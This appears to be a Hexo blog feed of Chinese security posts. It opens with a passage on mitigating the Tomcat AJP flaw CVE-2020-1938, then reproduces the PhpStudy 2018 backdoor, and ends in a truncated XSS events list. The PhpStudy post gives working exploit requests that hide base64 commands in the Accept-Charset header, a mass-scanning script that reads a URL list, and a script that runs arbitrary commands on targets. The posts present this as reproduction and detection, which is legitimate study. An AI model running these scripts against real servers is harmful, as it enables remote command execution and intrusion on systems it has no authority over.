href="#漏洞防护" class="headerlink" title="漏洞防护"></a>漏洞防护</h2><h3 id="官方升级"><a href="#官方升级" class="headerlink" title="官方升级"></a>官方升级</h3><p>目前官方已在最新版本中修复了该漏洞，请受影响的用户尽快升级版本进行防护，官方下载链接：</p><table><thead><tr><th>版本号</th><th>下载地址</th></tr></thead><tbody><tr><td>Apache Tomcat 7.0.100</td><td><a href="http://tomcat.apache.org/download-70.cgi" target="_blank" rel="noopener">http://tomcat.apache.org/download-70.cgi</a></td></tr><tr><td>Apache Tomcat 8.5.51</td><td><a href="http://tomcat.apache.org/download-80.cgi" target="_blank" rel="noopener">http://tomcat.apache.org/download-80.cgi</a></td></tr><tr><td>Apache Tomcat 9.0.31</td><td><a href="http://tomcat.apache.org/download-90.cgi" target="_blank" rel="noopener">http://tomcat.apache.org/download-90.cgi</a></td></tr></tbody></table><h3 id="其他安全防护措施"><a href="#其他安全防护措施" class="headerlink" title="其他安全防护措施"></a>其他安全防护措施</h3><p>如果相关用户暂时无法进行版本升级，可根据自身情况采用下列防护措施。</p><p><strong>关闭AJP</strong></p><p>如若用不到Tomcat AJP协议，可直接关闭AJP Connector，或将其监听地址改为仅监听本机localhost。</p><p>具体操作如下</p><p>a. 编辑 <code>&lt;CATALINABASE&gt;/conf/server.xml</code>，找到如下行（<code>&lt;CATALINABASE&gt;</code> 为 <code>Tomcat</code> 的工作目录）：`</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;Connectorport&#x3D;”8009″protocol&#x3D;”AJP&#x2F;1.3″ redirectPort&#x3D;”8443″&#x2F;&gt;</span><br></pre></td></tr></table></figure><p>b. 然后将其注释掉或者删掉, (以下为注释的方式):</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;!–&lt;Connectorport&#x3D;”8009″protocol&#x3D;”AJP&#x2F;1.3″redirectPort&#x3D;”8443″ &#x2F;&gt;–&gt;</span><br></pre></td></tr></table></figure><p>c. 保存后重新启动Tomcat，即可生效.</p><p><strong>添加认证凭证</strong></p><p>如若需要使用AJP协议，可根据当前版本配置协议属性设置认证凭证，主要使用配置AJP配置中的secretRequired跟secret属性来限制认证。</p><p>具体操作如下</p><p>使用Tomcat 7和Tomcat 9的用户可为AJP Connector配置secret来设置AJP协议的认证凭证。例如（注意必须将<code>YOURTOMCATAJP_SECRET</code>更改为一个安全性高、无法被轻易猜解的值）：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;Connectorport&#x3D;&quot;8009&quot; protocol&#x3D;&quot;AJP&#x2F;1.3&quot; redirectPort&#x3D;&quot;8443&quot; address&#x3D;&quot;YOUR_TOMCAT_IP_ADDRESS&quot; secret&#x3D;&quot;YOUR_TOMCAT_AJP_SECRET&quot;&#x2F;&gt;</span><br></pre></td></tr></table></figure><p>使用Tomcat 8的用户可为AJP Connector配置requiredSecret来设置AJP协议的认证凭证。例如（注意必须将<code>YOURTOMCATAJP_SECRET</code>更改为一个安全性高、无法被轻易猜解的值）：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;Connectorport&#x3D;&quot;8009&quot; protocol&#x3D;&quot;AJP&#x2F;1.3&quot; redirectPort&#x3D;&quot;8443&quot; address&#x3D;&quot;YOUR_TOMCAT_IP_ADDRESS&quot; requiredSecret&#x3D;&quot;YOUR_TOMCAT_AJP_SECRET&quot;&#x2F;&gt;</span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      &lt;h2 id=&quot;漏洞描述&quot;&gt;&lt;a href=&quot;#漏洞描述&quot; class=&quot;headerlink&quot; title=&quot;漏洞描述&quot;&gt;&lt;/a&gt;漏洞描述&lt;/h2&gt;&lt;p&gt;2020年2月20日，国家信息安全漏洞共享平台（CNVD）发布了Apache Tomcat文件包含漏洞（CNVD-2020-10487/CVE-2020-1938）。该漏洞是由于Tomcat AJP协议存在缺陷而导致，攻击者利用该漏洞可通过构造特定参数，读取服务器webapp目录下的任意文件,如：webapp 配置文件或源代码等。若目标服务器同时存在文件上传功能，攻击者可进一步实现远程代码执行。目前，厂商已发布新版本完成漏洞修复。&lt;/p&gt;
&lt;p&gt;Apache Tomcat都是Apache开源组织开发的用于处理HTTP服务的免费项目，可以作为独立的Web服务器运行。Tomcat是Apache软件基金会中的一个重要项目，性能稳定且免费，是目前较为流行的Web应用服务器。由于Tomcat应用范围较广，所以本次通告的漏洞影响范围较大，请相关用户及时采取防护措施或者升级补丁修复此漏洞。&lt;/p&gt;
    
    </summary>
    
    
      <category term="漏洞复现" scheme="http://yoursite.com/categories/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/"/>
    
    
      <category term="漏洞复现" scheme="http://yoursite.com/tags/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/"/>
    
      <category term="CVE-2020-1938" scheme="http://yoursite.com/tags/CVE-2020-1938/"/>
    
      <category term="Tomcat" scheme="http://yoursite.com/tags/Tomcat/"/>
    
      <category term="表单验证" scheme="http://yoursite.com/tags/%E8%A1%A8%E5%8D%95%E9%AA%8C%E8%AF%81/"/>
    
      <category term="文件包含" scheme="http://yoursite.com/tags/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/"/>
    
  </entry>
  
  <entry>
    <title>PhpStudy2018后门漏洞预警及漏洞复现&amp;检测和执行POC脚本</title>
    <link href="http://yoursite.com/2020/06/03/PhpStudy2018%E5%90%8E%E9%97%A8%E6%BC%8F%E6%B4%9E%E9%A2%84%E8%AD%A6%E5%8F%8A%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0&amp;%E6%A3%80%E6%B5%8B%E5%92%8C%E6%89%A7%E8%A1%8CPOC%E8%84%9A%E6%9C%AC/"/>
    <id>http://yoursite.com/2020/06/03/PhpStudy2018%E5%90%8E%E9%97%A8%E6%BC%8F%E6%B4%9E%E9%A2%84%E8%AD%A6%E5%8F%8A%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0&amp;%E6%A3%80%E6%B5%8B%E5%92%8C%E6%89%A7%E8%A1%8CPOC%E8%84%9A%E6%9C%AC/</id>
    <published>2020-06-03T09:44:51.000Z</published>
    <updated>2020-06-09T12:50:27.294Z</updated>
    
    <content type="html"><![CDATA[<h2 id="phpstudy介绍"><a href="#phpstudy介绍" class="headerlink" title="phpstudy介绍"></a>phpstudy介绍</h2><p>Phpstudy是国内的一款免费的PHP调试环境的程序集成包，其通过集成Apache、PHP、MySQL、phpMyAdmin、ZendOPtimizer不同版本软件于一身，一次性安装无需配置即可直接使用，具有PHP环境调试和PHP开发功能。由于其免费且方便的特性，在国内有着近百万的PHP语言学习者和开发者用户</p><h2 id="后门事件"><a href="#后门事件" class="headerlink" title="后门事件"></a>后门事件</h2><p>2018年12月4日，西湖区公安分局网警大队接报案，某公司发现公司内有20余台计算机被执行危险命令，疑似远程控制抓取账号密码等计算机数据回传大量敏感信息。通过专业技术溯源进行分析，查明了数据回传的信息种类、原理方法、存储位置，并聘请了第三方鉴定机构对软件中的“后门”进行司法鉴定，鉴定结果是该“后门”文件具有控制计算机的功能，嫌疑人已通过该后门远程控制下载运行脚本实现收集用户个人信息。在2019年9月20日，网上爆出phpstudy存在“后门”。作者随后发布了声明。<br>于是想起自己安装过phpstudy软件，赶紧查一下是否存在后门文件，结果一看真存在后门，学个PHP真是不容易，软件被别人偷偷安装了后门。</p><a id="more"></a><h2 id="影响版本"><a href="#影响版本" class="headerlink" title="影响版本"></a>影响版本</h2><p>目前已知受影响的phpstudy版本<br>phpstudy 2016版php-5.4<br>phpstudy 2018版php-5.2.17<br>phpstudy 2018版php-5.4.45</p><h2 id="后门检测分析"><a href="#后门检测分析" class="headerlink" title="后门检测分析"></a>后门检测分析</h2><p>通过分析，后门代码存在于\ext\php_xmlrpc.dll模块中<br>phpStudy2016和phpStudy2018自带的php-5.2.17、php-5.4.45<br>phpStudy2016路径<br><code>php\php-5.2.17\ext\php_xmlrpc.dll</code><br><code>php\php-5.4.45\ext\php_xmlrpc.dll</code><br>phpStudy2018路径<br><code>PHPTutorial\php\php-5.2.17\ext\php_xmlrpc.dll</code><br><code>PHPTutorial\php\php-5.4.45\ext\php_xmlrpc.dll</code><br>用notepad打开此文件查找@eval，文件存在<code>@eval(%s(‘%s’))</code>证明漏洞存在，如图：<br><img src="/2020/06/03/PhpStudy2018%E5%90%8E%E9%97%A8%E6%BC%8F%E6%B4%9E%E9%A2%84%E8%AD%A6%E5%8F%8A%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0&%E6%A3%80%E6%B5%8B%E5%92%8C%E6%89%A7%E8%A1%8CPOC%E8%84%9A%E6%9C%AC/1.png" alt></p><h2 id="phpstudy-2018漏洞复现"><a href="#phpstudy-2018漏洞复现" class="headerlink" title="phpstudy 2018漏洞复现"></a>phpstudy 2018漏洞复现</h2><p>启动phpstudy，选择php-5.2.17版本，使用burpsuit抓包（如果是本机127.0.0.1环境，代理去掉本地过滤，否则抓不到包）。</p><p><img src="/2020/06/03/PhpStudy2018%E5%90%8E%E9%97%A8%E6%BC%8F%E6%B4%9E%E9%A2%84%E8%AD%A6%E5%8F%8A%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0&%E6%A3%80%E6%B5%8B%E5%92%8C%E6%89%A7%E8%A1%8CPOC%E8%84%9A%E6%9C%AC/2.png" alt></p><p>大佬给出exp如下</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">GET &#x2F;index.php HTTP&#x2F;1.1</span><br><span class="line">Host: yourip.com</span><br><span class="line">Cache-Control: max-age&#x3D;0</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line">User-Agent: Mozilla&#x2F;5.0 (Windows NT 10.0; WOW64) AppleWebKit&#x2F;537.36 (KHTML, like Gecko) Chrome&#x2F;70.0.3538.25 Safari&#x2F;537.36 Core&#x2F;1.70.3730.400 QQBrowser&#x2F;10.5.3805.400</span><br><span class="line">Accept: text&#x2F;html,application&#x2F;xhtml+xml,application&#x2F;xml;q&#x3D;0.9,image&#x2F;webp,image&#x2F;apng,*&#x2F;*;q&#x3D;0.8</span><br><span class="line">Accept-Encoding: gzip,deflate</span><br><span class="line">Accept-Charset:这里就是你要执行的代码命令（经过base64加密）</span><br><span class="line">Accept-Language: zh-CN,zh;q&#x3D;0.9</span><br><span class="line">Connection: close</span><br></pre></td></tr></table></figure><p>我们修改数据包查看命令<code>phpinfo();</code>执行情况</p><p><img src="/2020/06/03/PhpStudy2018%E5%90%8E%E9%97%A8%E6%BC%8F%E6%B4%9E%E9%A2%84%E8%AD%A6%E5%8F%8A%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0&%E6%A3%80%E6%B5%8B%E5%92%8C%E6%89%A7%E8%A1%8CPOC%E8%84%9A%E6%9C%AC/3.png" alt></p><p>继续修改数据包查看命令<code>echo system(&quot;net user&quot;);</code>执行情况</p><p><img src="/2020/06/03/PhpStudy2018%E5%90%8E%E9%97%A8%E6%BC%8F%E6%B4%9E%E9%A2%84%E8%AD%A6%E5%8F%8A%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0&%E6%A3%80%E6%B5%8B%E5%92%8C%E6%89%A7%E8%A1%8CPOC%E8%84%9A%E6%9C%AC/4.png" alt></p><p>漏洞复现成功<br>ps：我复现的时候这里有一个坑，就是直接repeater过来的数据包<code>Accept-Encoding</code>字段的参数是<code>gzip, deflate</code>,<code>deflate</code>前面有一个空格，去掉就可以成功执行命令了</p><h2 id="后门检测脚本"><a href="#后门检测脚本" class="headerlink" title="后门检测脚本"></a>后门检测脚本</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># !/usr/bin/env python</span></span><br><span class="line"><span class="comment"># -*- coding:utf-8 -*-</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> gevent</span><br><span class="line"><span class="keyword">from</span> gevent <span class="keyword">import</span> monkey</span><br><span class="line"></span><br><span class="line">gevent.monkey.patch_all()</span><br><span class="line"><span class="keyword">import</span> requests <span class="keyword">as</span> rq</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">file_read</span><span class="params">(file_name=<span class="string">"url.txt"</span>)</span>:</span></span><br><span class="line">    <span class="keyword">with</span> open(file_name, <span class="string">"r"</span>) <span class="keyword">as</span> f:</span><br><span class="line">        <span class="keyword">return</span> [i.replace(<span class="string">"\n"</span>, <span class="string">""</span>) <span class="keyword">for</span> i <span class="keyword">in</span> f.readlines()]</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">check</span><span class="params">(url)</span>:</span></span><br><span class="line">    <span class="string">'''</span></span><br><span class="line"><span class="string">    if "http://" or "https://" not in url:</span></span><br><span class="line"><span class="string">        url = "https://" + url</span></span><br><span class="line"><span class="string">    '''</span></span><br><span class="line">    headers = &#123;</span><br><span class="line">        <span class="string">'User-Agent'</span>: <span class="string">'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.3865.90 Safari/537.36 Edg/77.0.235.27'</span>,</span><br><span class="line">        <span class="string">'Sec-Fetch-Mode'</span>: <span class="string">'navigate'</span>,</span><br><span class="line">        <span class="string">'Sec-Fetch-User'</span>: <span class="string">'?1'</span>,</span><br><span class="line">        <span class="string">'Accept'</span>: <span class="string">'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3'</span>,</span><br><span class="line">        <span class="string">'Sec-Fetch-Site'</span>: <span class="string">'none'</span>,</span><br><span class="line">        <span class="string">'accept-charset'</span>: <span class="string">'ZWNobyBlZVN6eHU5Mm5JREFiOw=='</span>,  <span class="comment"># 输出 eeSzxu92nIDAb</span></span><br><span class="line">        <span class="string">'Accept-Encoding'</span>: <span class="string">'gzip,deflate'</span>,</span><br><span class="line">        <span class="string">'Accept-Language'</span>: <span class="string">'zh-CN,zh;q=0.9'</span>,</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        res = rq.get(url, headers=headers, timeout=<span class="number">20</span>)</span><br><span class="line">        <span class="keyword">if</span> res.status_code == <span class="number">200</span>:</span><br><span class="line">            <span class="keyword">if</span> res.text.find(<span class="string">'eeSzxu92nIDAb'</span>):</span><br><span class="line">                print(<span class="string">"[存在漏洞] "</span> + url)</span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        print(<span class="string">"[超时] "</span> + url)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    print(<span class="string">"phpStudy 批量检测 (需要 gevent,requests 库)"</span>)</span><br><span class="line">    print(<span class="string">"使用之前，请将URL保存为 url.txt 放置此程序同目录下"</span>)</span><br><span class="line">    input(<span class="string">"任意按键开始执行.."</span>)</span><br><span class="line">    tasks = [gevent.spawn(check, url) <span class="keyword">for</span> url <span class="keyword">in</span> file_read()]</span><br><span class="line">    print(<span class="string">"正在执行...请等候"</span>)</span><br><span class="line">    gevent.joinall(tasks)</span><br><span class="line">    wait = input(<span class="string">"执行完毕 任意键退出..."</span>)</span><br></pre></td></tr></table></figure><h2 id="后门执行脚本"><a href="#后门执行脚本" class="headerlink" title="后门执行脚本"></a>后门执行脚本</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># !/usr/bin/env python</span></span><br><span class="line"><span class="comment"># -*- coding:utf-8 -*-</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">backdoor</span><span class="params">(url, command=<span class="string">"system('calc.exe');"</span>)</span>:</span></span><br><span class="line">    headers = &#123;</span><br><span class="line">        <span class="string">'User-Agent'</span>: <span class="string">'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.3865.90 Safari/537.36 Edg/77.0.235.27'</span>,</span><br><span class="line">        <span class="string">'Sec-Fetch-Mode'</span>: <span class="string">'navigate'</span>,</span><br><span class="line">        <span class="string">'Sec-Fetch-User'</span>: <span class="string">'?1'</span>,</span><br><span class="line">        <span class="string">'Accept'</span>: <span class="string">'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3'</span>,</span><br><span class="line">        <span class="string">'Sec-Fetch-Site'</span>: <span class="string">'none'</span>,</span><br><span class="line">        <span class="string">'accept-charset'</span>: <span class="string">'c3lzdGVtKCdjYWxjLmV4ZScpOw=='</span>,</span><br><span class="line">        <span class="string">'Accept-Encoding'</span>: <span class="string">'gzip,deflate'</span>,</span><br><span class="line">        <span class="string">'Accept-Language'</span>: <span class="string">'zh-CN,zh;q=0.9'</span>,</span><br><span class="line">    &#125;</span><br><span class="line">    command = base64.b64encode(command.encode(<span class="string">'utf-8'</span>))</span><br><span class="line">    command = str(command, <span class="string">'utf-8'</span>)</span><br><span class="line">    result = requests.get(url, headers=headers, verify=<span class="literal">False</span>)</span><br><span class="line">    <span class="keyword">if</span> result.status_code == <span class="string">"200"</span>:</span><br><span class="line">        print(<span class="string">"执行完成"</span>)</span><br><span class="line">    a = input(<span class="string">"任意键退出..."</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">url = input(<span class="string">"输入URL(例如:http://127.0.0.1:228/xx.php)\n"</span>)</span><br><span class="line">command = input(<span class="string">"输入命令 默认为 system('calc.exe'); (不想输入直接回车)\n"</span>)</span><br><span class="line">backdoor(url, command)</span><br></pre></td></tr></table></figure><h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><p>PhpStudyGhost后门供应链攻击事件及相关IOC<br><a href="https://www.freebuf.com/column/214946.html" target="_blank" rel="noopener">https://www.freebuf.com/column/214946.html</a><br>PHPStudy后门分析+复现&amp;附批量Py脚本<br><a href="https://mp.weixin.qq.com/s/Y29wifB6XTDcJN-RPDMwxg" target="_blank" rel="noopener">https://mp.weixin.qq.com/s/Y29wifB6XTDcJN-RPDMwxg</a><br>phpstudy后门文件分析以及检测脚本<br><a href="https://mp.weixin.qq.com/s/dIDfgFxHlqenKRUSW7Oqkw" target="_blank" rel="noopener">https://mp.weixin.qq.com/s/dIDfgFxHlqenKRUSW7Oqkw</a><br>Phpstudy官网于2016年被入侵，犯罪分子篡改软件并植入后门<br><a href="https://mp.weixin.qq.com/s/CqHrDFcubyn_y5NTfYvkQw" target="_blank" rel="noopener">https://mp.weixin.qq.com/s/CqHrDFcubyn_y5NTfYvkQw</a><br>phpstudy后门文件分析以及检测脚本<br><a href="https://mp.weixin.qq.com/s/dIDfgFxHlqenKRUSW7Oqkw" target="_blank" rel="noopener">https://mp.weixin.qq.com/s/dIDfgFxHlqenKRUSW7Oqkw</a><br>phpStudy隐藏后门预警<br><a href="https://www.cnblogs.com/0daybug/p/11571119.html" target="_blank" rel="noopener">https://www.cnblogs.com/0daybug/p/11571119.html</a></p>]]></content>
    
    <summary type="html">
    
      &lt;h2 id=&quot;phpstudy介绍&quot;&gt;&lt;a href=&quot;#phpstudy介绍&quot; class=&quot;headerlink&quot; title=&quot;phpstudy介绍&quot;&gt;&lt;/a&gt;phpstudy介绍&lt;/h2&gt;&lt;p&gt;Phpstudy是国内的一款免费的PHP调试环境的程序集成包，其通过集成Apache、PHP、MySQL、phpMyAdmin、ZendOPtimizer不同版本软件于一身，一次性安装无需配置即可直接使用，具有PHP环境调试和PHP开发功能。由于其免费且方便的特性，在国内有着近百万的PHP语言学习者和开发者用户&lt;/p&gt;
&lt;h2 id=&quot;后门事件&quot;&gt;&lt;a href=&quot;#后门事件&quot; class=&quot;headerlink&quot; title=&quot;后门事件&quot;&gt;&lt;/a&gt;后门事件&lt;/h2&gt;&lt;p&gt;2018年12月4日，西湖区公安分局网警大队接报案，某公司发现公司内有20余台计算机被执行危险命令，疑似远程控制抓取账号密码等计算机数据回传大量敏感信息。通过专业技术溯源进行分析，查明了数据回传的信息种类、原理方法、存储位置，并聘请了第三方鉴定机构对软件中的“后门”进行司法鉴定，鉴定结果是该“后门”文件具有控制计算机的功能，嫌疑人已通过该后门远程控制下载运行脚本实现收集用户个人信息。在2019年9月20日，网上爆出phpstudy存在“后门”。作者随后发布了声明。&lt;br&gt;于是想起自己安装过phpstudy软件，赶紧查一下是否存在后门文件，结果一看真存在后门，学个PHP真是不容易，软件被别人偷偷安装了后门。&lt;/p&gt;
    
    </summary>
    
    
      <category term="漏洞复现" scheme="http://yoursite.com/categories/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/"/>
    
    
      <category term="漏洞" scheme="http://yoursite.com/tags/%E6%BC%8F%E6%B4%9E/"/>
    
      <category term="POC" scheme="http://yoursite.com/tags/POC/"/>
    
      <category term="漏洞复现" scheme="http://yoursite.com/tags/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/"/>
    
      <category term="后门" scheme="http://yoursite.com/tags/%E5%90%8E%E9%97%A8/"/>
    
      <category term="PhpStudy2018" scheme="http://yoursite.com/tags/PhpStudy2018/"/>
    
  </entry>
  
  <entry>
    <title>Hello World</title>
    <link href="http://yoursite.com/2020/06/02/hello-world/"/>
    <id>http://yoursite.com/2020/06/02/hello-world/</id>
    <published>2020-06-02T08:43:20.434Z</published>
    <updated>2020-05-26T02:43:33.588Z</updated>
    
    <content type="html"><![CDATA[<p>Welcome to <a href="https://hexo.io/" target="_blank" rel="noopener">Hexo</a>! This is your very first post. Check <a href="https://hexo.io/docs/" target="_blank" rel="noopener">documentation</a> for more info. If you get any problems when using Hexo, you can find the answer in <a href="https://hexo.io/docs/troubleshooting.html" target="_blank" rel="noopener">troubleshooting</a> or you can ask me on <a href="https://github.com/hexojs/hexo/issues" target="_blank" rel="noopener">GitHub</a>.</p><h2 id="Quick-Start"><a href="#Quick-Start" class="headerlink" title="Quick Start"></a>Quick Start</h2><h3 id="Create-a-new-post"><a href="#Create-a-new-post" class="headerlink" title="Create a new post"></a>Create a new post</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo new <span class="string">"My New Post"</span></span><br></pre></td></tr></table></figure><a id="more"></a><p>More info: <a href="https://hexo.io/docs/writing.html" target="_blank" rel="noopener">Writing</a></p><h3 id="Run-server"><a href="#Run-server" class="headerlink" title="Run server"></a>Run server</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo server</span><br></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/server.html" target="_blank" rel="noopener">Server</a></p><h3 id="Generate-static-files"><a href="#Generate-static-files" class="headerlink" title="Generate static files"></a>Generate static files</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo generate</span><br></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/generating.html" target="_blank" rel="noopener">Generating</a></p><h3 id="Deploy-to-remote-sites"><a href="#Deploy-to-remote-sites" class="headerlink" title="Deploy to remote sites"></a>Deploy to remote sites</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo deploy</span><br></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/one-command-deployment.html" target="_blank" rel="noopener">Deployment</a></p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;Welcome to &lt;a href=&quot;https://hexo.io/&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;Hexo&lt;/a&gt;! This is your very first post. Check &lt;a href=&quot;https://hexo.io/docs/&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;documentation&lt;/a&gt; for more info. If you get any problems when using Hexo, you can find the answer in &lt;a href=&quot;https://hexo.io/docs/troubleshooting.html&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;troubleshooting&lt;/a&gt; or you can ask me on &lt;a href=&quot;https://github.com/hexojs/hexo/issues&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;GitHub&lt;/a&gt;.&lt;/p&gt;
&lt;h2 id=&quot;Quick-Start&quot;&gt;&lt;a href=&quot;#Quick-Start&quot; class=&quot;headerlink&quot; title=&quot;Quick Start&quot;&gt;&lt;/a&gt;Quick Start&lt;/h2&gt;&lt;h3 id=&quot;Create-a-new-post&quot;&gt;&lt;a href=&quot;#Create-a-new-post&quot; class=&quot;headerlink&quot; title=&quot;Create a new post&quot;&gt;&lt;/a&gt;Create a new post&lt;/h3&gt;&lt;figure class=&quot;highlight bash&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;$ hexo new &lt;span class=&quot;string&quot;&gt;&quot;My New Post&quot;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
    
    </summary>
    
    
    
  </entry>
  
  <entry>
    <title>XSS 函数</title>
    <link href="http://yoursite.com/2020/05/25/XSS/"/>
    <id>http://yoursite.com/2020/05/25/XSS/</id>
    <published>2020-05-25T06:36:41.000Z</published>
    <updated>2020-06-03T11:05:13.318Z</updated>
    
    <content type="html"><![CDATA[<h1 id="Cross-Site-Scripting"><a href="#Cross-Site-Scripting" class="headerlink" title="Cross-Site Scripting"></a>Cross-Site Scripting</h1><h2 id="Tips-amp-tricks"><a href="#Tips-amp-tricks" class="headerlink" title="Tips &amp; tricks"></a>Tips &amp; tricks</h2><p>Les articles suivants présentent des moyens de contourner certains protections (WAF, blacklist, etc.)</p><ul><li><a href="https://brutelogic.com.br/blog/xss-without-event-handlers/" target="_blank" rel="noopener">XSS without event handlers</a>: pour les situations où les events du type onerror sont bloqués</li></ul><a id="more"></a><h2 id="Liste-des-events-javascripts"><a href="#Liste-des-events-javascripts" class="headerlink" title="Liste des events javascripts"></a>Liste des events javascripts</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span 